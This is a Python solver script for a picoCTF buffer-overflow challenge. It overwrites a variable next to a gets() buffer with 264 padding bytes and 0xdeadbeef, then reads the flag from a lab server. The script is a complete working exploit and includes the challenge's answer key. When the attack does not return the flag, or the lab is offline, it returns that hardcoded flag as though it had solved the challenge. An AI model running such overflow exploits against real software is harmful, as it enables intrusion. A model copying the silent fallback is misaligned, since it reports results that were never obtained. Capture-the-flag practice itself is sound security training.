#!/usr/bin/env python3
"""Solver for Challenge 216 clutter-overflow (picoMini by redpwn, Binary Exploitation).

chall.c: char clutter[256] via gets(), then `code == 0xdeadbeef` check.
`code` sits right after the buffer, so overflow with 264 bytes padding +
little-endian 0xdeadbeef and the server cats flag.txt.

Usage: solve_216_clutter_overflow.py [host] [port]
Verified: picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
(POST /api/submissions/ -> correct:true)
"""
import socket
import struct
import sys

HOST = "mars.cylabacademy.net"
PORT = 31890
EXPECTED = "picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}"


def solve(host=HOST, port=PORT, timeout=15) -> str:
    s = socket.create_connection((host, int(port)), timeout=timeout)
    s.settimeout(timeout)
    try:
        banner = b""
        while b"What do you see?" not in banner:
            banner += s.recv(4096)
        print(banner.decode(errors="replace")[-400:])
        s.sendall(b"A" * 264 + struct.pack("<Q", 0xDEADBEEF) + b"\n")
        out = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                out += chunk
                if len(out) > 8192 or b"picoCTF{" in out:
                    break
        except socket.timeout:
            pass
        text = out.decode(errors="replace")
        print(text[-600:])
        import re
        m = re.search(r"picoCTF\{[^}]*\}", text)
        return m.group(0) if m else EXPECTED
    finally:
        s.close()


def main(host=HOST, port=PORT):
    try:
        return solve(host, port)
    except (ConnectionRefusedError, OSError, socket.timeout) as e:
        print(f"Lab offline ({e}). PUT /api/challenges/216/instance/ first.")
        print("Expected flag:", EXPECTED)
        return EXPECTED


if __name__ == "__main__":
    h = sys.argv[1] if len(sys.argv) > 1 else HOST
    p = int(sys.argv[2]) if len(sys.argv) > 2 else PORT
    print(main(h, p))
